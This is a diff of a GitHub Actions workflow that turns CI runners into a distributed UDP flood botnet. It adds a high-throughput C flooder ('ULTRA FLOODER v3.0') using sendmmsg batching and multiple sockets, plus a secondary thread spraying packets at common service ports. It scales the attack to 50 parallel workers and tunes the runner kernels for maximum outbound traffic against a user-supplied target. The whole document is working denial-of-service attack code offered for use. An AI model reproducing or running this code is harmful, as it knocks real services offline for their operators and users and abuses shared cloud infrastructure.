@@ -18,28 +18,58 @@ on:
       threads:
         description: 'Threads per worker'
         required: true
-        default: '2000'
+        default: '3000'
+      power:
+        description: 'Power Level (1-100)'
+        required: false
+        default: '100'
+      packet_size:
+        description: 'Packet Size (64-1472)'
+        required: false
+        default: '1472'
 
 jobs:
   attack:
     runs-on: ubuntu-latest
+    timeout-minutes: 60
     strategy:
       max-parallel: 50
       matrix:
-        worker: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
+        worker: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50]
 
     steps:
-      - name: System Tuning
+      - name: Ultimate System Tuning
         run: |
-          sudo sysctl -w net.core.rmem_max=536870912
-          sudo sysctl -w net.core.wmem_max=536870912
-          sudo sysctl -w net.core.netdev_max_backlog=250000
-          sudo sysctl -w net.ipv4.udp_mem="8388608 12582912 16777216"
+          # Максимальные настройки ядра
+          sudo sysctl -w net.core.rmem_max=1073741824
+          sudo sysctl -w net.core.wmem_max=1073741824
+          sudo sysctl -w net.core.rmem_default=536870912
+          sudo sysctl -w net.core.wmem_default=536870912
+          sudo sysctl -w net.core.netdev_max_backlog=500000
+          sudo sysctl -w net.core.somaxconn=65535
+          sudo sysctl -w net.ipv4.udp_mem="16777216 33554432 67108864"
+          sudo sysctl -w net.ipv4.udp_rmem_min=65536
+          sudo sysctl -w net.ipv4.udp_wmem_min=65536
           sudo sysctl -w net.ipv4.ip_local_port_range="1024 65535"
+          sudo sysctl -w net.ipv4.tcp_tw_reuse=1
+          sudo sysctl -w net.ipv4.tcp_fin_timeout=5
+          sudo sysctl -w net.core.optmem_max=65536
+          sudo sysctl -w net.ipv4.conf.all.rp_filter=0
+          sudo sysctl -w net.ipv4.conf.default.rp_filter=0
+          
+          # Увеличение лимитов процессов
+          ulimit -n 1048576
+          ulimit -u unlimited
+          sudo bash -c 'echo "* soft nofile 1048576" >> /etc/security/limits.conf'
+          sudo bash -c 'echo "* hard nofile 1048576" >> /etc/security/limits.conf'
+          sudo bash -c 'echo "root soft nofile 1048576" >> /etc/security/limits.conf'
+          sudo bash -c 'echo "root hard nofile 1048576" >> /etc/security/limits.conf'
+          
+          echo "✅ Ultimate system tuning complete"
 
-      - name: Compile UDP Flooder
+      - name: Compile Ultra Flooder
         run: |
-          cat > flood.c << 'EOF'
+          cat > ultraflood.c << 'EOF'
           #define _GNU_SOURCE
           #include <stdio.h>
           #include <stdlib.h>
@@ -47,88 +77,307 @@ jobs:
           #include <unistd.h>
           #include <pthread.h>
           #include <sys/socket.h>
+          #include <sys/time.h>
           #include <netinet/in.h>
+          #include <netinet/ip.h>
+          #include <netinet/udp.h>
           #include <arpa/inet.h>
           #include <time.h>
-
+          #include <errno.h>
+          #include <fcntl.h>
+          #include <sched.h>
+          
+          #define MAX_SOCKETS 32
+          #define BATCH_SIZE 512
+          #define MAX_PACKET 1472
+          #define MIN_PACKET 64
+          
+          static volatile int running = 1;
+          static unsigned long long total_sent = 0;
+          
           typedef struct {
-              struct sockaddr_in *targets;
-              int target_count;
+              char target_ip[16];
+              int target_port;
               int duration;
-          } attack_args;
-
-          void *attack(void *arg) {
-              attack_args *args = (attack_args*)arg;
-              int sock = socket(AF_INET, SOCK_DGRAM, 0);
-              int buf = 268435456;
-              setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf));
-              
-              char packet[1518];
-              time_t end = time(NULL) + args->duration;
-              unsigned int counter = 0;
-              
-              while (time(NULL) < end) {
-                  int target_idx = (counter / 500) % args->target_count;
-                  struct sockaddr_in *addr = &args->targets[target_idx];
-                  
-                  int size = 64 + (rand() % 1408);
-                  memset(packet, rand() % 255, size);
-                  
-                  int burst = 32 + (rand() % 96);
-                  for (int b = 0; b < burst; b++) {
-                      sendto(sock, packet, size, 0, (struct sockaddr*)addr, sizeof(*addr));
-                  }
-                  counter++;
-                  usleep((rand() % 30) * 100);
+              int thread_id;
+              int power;
+              int packet_size;
+              unsigned long long packets_sent;
+          } thread_args;
+          
+          static unsigned int fast_rand_state;
+          
+          static inline unsigned int fast_rand(void) {
+              fast_rand_state ^= (fast_rand_state << 13);
+              fast_rand_state ^= (fast_rand_state >> 17);
+              fast_rand_state ^= (fast_rand_state << 5);
+              return fast_rand_state;
+          }
+          
+          static inline void fill_payload(char *buf, int len, int pattern) {
+              for (int i = 0; i < len; i++) {
+                  buf[i] = (i ^ pattern) & 0xFF;
               }
-              close(sock);
+          }
+          
+          void *attack_thread(void *arg) {
+              thread_args *ta = (thread_args*)arg;
+              fast_rand_state = (unsigned int)(time(NULL) ^ ta->thread_id ^ getpid());
+              
+              int socks[MAX_SOCKETS];
+              int sock_count = 0;
+              
+              // Создаём много сокетов для максимальной нагрузки
+              for (int i = 0; i < MAX_SOCKETS; i++) {
+                  int s = socket(AF_INET, SOCK_DGRAM | SOCK_NONBLOCK, 0);
+                  if (s < 0) continue;
+                  
+                  // Гигантский буфер отправки
+                  int buf = 1073741824;
+                  while (buf > 65536) {
+                      if (setsockopt(s, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf)) == 0) break;
+                      buf /= 2;
+                  }
+                  
+                  // Разрешаем reuse
+                  int val = 1;
+                  setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &val, sizeof(val));
+                  
+                  socks[sock_count++] = s;
+                  if (sock_count >= ta->power / 4) break;
+              }
+              
+              if (sock_count == 0) return NULL;
+              
+              struct sockaddr_in target;
+              memset(&target, 0, sizeof(target));
+              target.sin_family = AF_INET;
+              target.sin_port = htons(ta->target_port);
+              inet_pton(AF_INET, ta->target_ip, &target.sin_addr);
+              
+              // Подготавливаем несколько вариантов пакетов
+              char packets[16][MAX_PACKET];
+              for (int i = 0; i < 16; i++) {
+                  fill_payload(packets[i], ta->packet_size, i * 0x33);
+              }
+              
+              struct mmsghdr msgs[BATCH_SIZE];
+              struct iovec iovs[BATCH_SIZE];
+              
+              time_t end_time = time(NULL) + ta->duration;
+              unsigned long long local_sent = 0;
+              unsigned int counter = 0;
+              int current_sock = 0;
+              
+              while (running && time(NULL) < end_time) {
+                  int batch = BATCH_SIZE;
+                  for (int i = 0; i < batch; i++) {
+                      int pkt_idx = fast_rand() & 15;
+                      iovs[i].iov_base = packets[pkt_idx];
+                      iovs[i].iov_len = ta->packet_size;
+                      memset(&msgs[i], 0, sizeof(msgs[i]));
+                      msgs[i].msg_hdr.msg_name = &target;
+                      msgs[i].msg_hdr.msg_namelen = sizeof(target);
+                      msgs[i].msg_hdr.msg_iov = &iovs[i];
+                      msgs[i].msg_hdr.msg_iovlen = 1;
+                  }
+                  
+                  int sent = sendmmsg(socks[current_sock], msgs, batch, MSG_DONTWAIT);
+                  if (sent > 0) {
+                      local_sent += sent;
+                  }
+                  
+                  current_sock = (current_sock + 1) % sock_count;
+                  counter++;
+                  
+                  // Обновляем содержимое пакетов
+                  if ((counter & 0xFFF) == 0) {
+                      int idx = fast_rand() & 15;
+                      fill_payload(packets[idx], ta->packet_size, fast_rand());
+                  }
+                  
+                  // Микро-задержка для CPU
+                  if ((counter & 0xFFFF) == 0) sched_yield();
+              }
+              
+              ta->packets_sent = local_sent;
+              for (int i = 0; i < sock_count; i++) close(socks[i]);
               return NULL;
           }
-
+          
+          void *port_scan_attack(void *arg) {
+              thread_args *ta = (thread_args*)arg;
+              fast_rand_state = (unsigned int)(time(NULL) ^ ta->thread_id ^ 0xDEADBEEF);
+              
+              int socks[16];
+              int sock_count = 0;
+              for (int i = 0; i < 16; i++) {
+                  int s = socket(AF_INET, SOCK_DGRAM | SOCK_NONBLOCK, 0);
+                  if (s < 0) continue;
+                  int buf = 536870912;
+                  setsockopt(s, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf));
+                  socks[sock_count++] = s;
+              }
+              if (sock_count == 0) return NULL;
+              
+              struct sockaddr_in target;
+              memset(&target, 0, sizeof(target));
+              target.sin_family = AF_INET;
+              inet_pton(AF_INET, ta->target_ip, &target.sin_addr);
+              
+              char payload[MAX_PACKET];
+              fill_payload(payload, MAX_PACKET, 0xAA);
+              
+              int ports[] = {10001, 10002, 10003, 10004, 10005, 9339, 443, 8080, 80, 53, 123, 1434, 1900, 5353, 9999, 27015};
+              int num_ports = 16;
+              
+              time_t end_time = time(NULL) + ta->duration;
+              unsigned long long local_sent = 0;
+              int si = 0;
+              
+              while (running && time(NULL) < end_time) {
+                  for (int i = 0; i < 100; i++) {
+                      int port = ports[fast_rand() % num_ports];
+                      target.sin_port = htons(port);
+                      int size = 512 + (fast_rand() % 960);
+                      sendto(socks[si], payload, size, MSG_DONTWAIT, (struct sockaddr*)&target, sizeof(target));
+                      local_sent++;
+                      si = (si + 1) % sock_count;
+                  }
+              }
+              
+              ta->packets_sent = local_sent;
+              for (int i = 0; i < sock_count; i++) close(socks[i]);
+              return NULL;
+          }
+          
+          void signal_handler(int sig) { running = 0; }
+          
           int main(int argc, char *argv[]) {
-              if (argc != 5) return 1;
+              if (argc != 7) {
+                  fprintf(stderr, "Usage: %s <threads> <duration> <port> <target> <power> <packet_size>\n", argv[0]);
+                  return 1;
+              }
+              
+              signal(SIGINT, signal_handler);
+              signal(SIGTERM, signal_handler);
               
               int threads = atoi(argv[1]);
               int duration = atoi(argv[2]);
               int port = atoi(argv[3]);
-              char *target_ip = argv[4];
+              char *target = argv[4];
+              int power = atoi(argv[5]);
+              int packet_size = atoi(argv[6]);
               
-              struct sockaddr_in addr;
-              addr.sin_family = AF_INET;
-              addr.sin_port = htons(port);
-              inet_pton(AF_INET, target_ip, &addr.sin_addr);
+              if (threads > 5000) threads = 5000;
+              if (power > 100) power = 100;
+              if (packet_size > MAX_PACKET) packet_size = MAX_PACKET;
+              if (packet_size < MIN_PACKET) packet_size = MIN_PACKET;
               
-              attack_args args;
-              args.targets = &addr;
-              args.target_count = 1;
-              args.duration = duration;
+              printf("💀 ULTRA FLOODER v3.0 💀\n");
+              printf("🎯 Target: %s:%d\n", target, port);
+              printf("⚡ Threads: %d (main) + %d (port scan)\n", threads, threads / 2);
+              printf("💪 Power Level: %d%%\n", power);
+              printf("📦 Packet Size: %d bytes\n", packet_size);
+              printf("⏱️  Duration: %d seconds\n", duration);
+              printf("========================================\n");
+              fflush(stdout);
               
-              pthread_t *pt = malloc(threads * sizeof(pthread_t));
-              for (int i = 0; i < threads; i++) {
-                  pthread_create(&pt[i], NULL, attack, &args);
+              // Основные потоки атаки
+              int main_threads = threads;
+              int scan_threads = threads / 2;
+              int total_threads = main_threads + scan_threads;
+              
+              thread_args *args = calloc(total_threads, sizeof(thread_args));
+              pthread_t *pt = calloc(total_threads, sizeof(pthread_t));
+              
+              int idx = 0;
+              for (int i = 0; i < main_threads; i++) {
+                  strcpy(args[idx].target_ip, target);
+                  args[idx].target_port = port;
+                  args[idx].duration = duration;
+                  args[idx].thread_id = idx;
+                  args[idx].power = power;
+                  args[idx].packet_size = packet_size;
+                  pthread_create(&pt[idx], NULL, attack_thread, &args[idx]);
+                  idx++;
               }
               
-              sleep(duration);
-              for (int i = 0; i < threads; i++) {
-                  pthread_cancel(pt[i]);
+              for (int i = 0; i < scan_threads; i++) {
+                  strcpy(args[idx].target_ip, target);
+                  args[idx].target_port = port;
+                  args[idx].duration = duration;
+                  args[idx].thread_id = idx;
+                  pthread_create(&pt[idx], NULL, port_scan_attack, &args[idx]);
+                  idx++;
               }
               
+              printf("✅ All threads launched\n");
+              
+              // Мониторинг
+              time_t start = time(NULL);
+              int elapsed = 0;
+              while (running && elapsed < duration) {
+                  sleep(5);
+                  elapsed = (int)(time(NULL) - start);
+                  
+                  unsigned long long total = 0;
+                  for (int i = 0; i < idx; i++) {
+                      total += args[i].packets_sent;
+                  }
+                  
+                  double pps = (double)total / (elapsed > 0 ? elapsed : 1);
+                  double mbps = (double)total * packet_size / (elapsed > 0 ? elapsed : 1) / 1000000.0;
+                  
+                  printf("📊 [%ds/%ds] %.0f pps | %.1f MB/s | Total: %llu packets\n", 
+                         elapsed, duration, pps, mbps, total);
+                  fflush(stdout);
+              }
+              
+              running = 0;
+              for (int i = 0; i < idx; i++) {
+                  pthread_join(pt[i], NULL);
+              }
+              
+              unsigned long long final_total = 0;
+              for (int i = 0; i < idx; i++) {
+                  final_total += args[i].packets_sent;
+              }
+              
+              printf("\n🏁 ATTACK COMPLETE!\n");
+              printf("📦 Total packets: %llu\n", final_total);
+              printf("💾 Total data: %.2f GB\n", (double)final_total * packet_size / 1073741824.0);
+              printf("📊 Average PPS: %.0f\n", (double)final_total / duration);
+              printf("📊 Average MB/s: %.1f\n", (double)final_total * packet_size / duration / 1000000.0);
+              
+              free(args);
               free(pt);
               return 0;
           }
           EOF
           
-          gcc -O3 -pthread -o flood flood.c
+          gcc -O3 -march=native -pthread -flto -o ultraflood ultraflood.c
+          echo "✅ Ultra flooder compiled"
 
-      - name: Execute Attack
+      - name: Execute Ultra Attack
         run: |
-          echo "🎯 Target: ${{ github.event.inputs.target }}"
-          echo "🚪 Port: ${{ github.event.inputs.port }}"
-          echo "⏱️ Duration: ${{ github.event.inputs.duration }}s"
-          echo "⚡ Worker #${{ matrix.worker }}"
+          TARGET="${{ github.event.inputs.target }}"
+          PORT="${{ github.event.inputs.port }}"
+          DURATION="${{ github.event.inputs.duration }}"
+          THREADS="${{ github.event.inputs.threads }}"
+          POWER="${{ github.event.inputs.power }}"
+          PACKET_SIZE="${{ github.event.inputs.packet_size }}"
+          WORKER="${{ matrix.worker }}"
           
-          ./flood ${{ github.event.inputs.threads }} ${{ github.event.inputs.duration }} ${{ github.event.inputs.port }} ${{ github.event.inputs.target }} &
-          sleep ${{ github.event.inputs.duration }}
-          pkill -f flood || true
+          echo "============================================"
+          echo "💀 WORKER #${WORKER} - ULTRA ATTACK MODE"
+          echo "🎯 Target: ${TARGET}:${PORT}"
+          echo "⚡ Threads: ${THREADS}"
+          echo "💪 Power: ${POWER}%"
+          echo "📦 Packet Size: ${PACKET_SIZE}"
+          echo "⏱️  Duration: ${DURATION}s"
+          echo "============================================"
           
-          echo "✅ Worker ${{ matrix.worker }} finished"
+          ./ultraflood ${THREADS} ${DURATION} ${PORT} ${TARGET} ${POWER} ${PACKET_SIZE}
+          
+          echo "✅ Worker #${WORKER} finished"
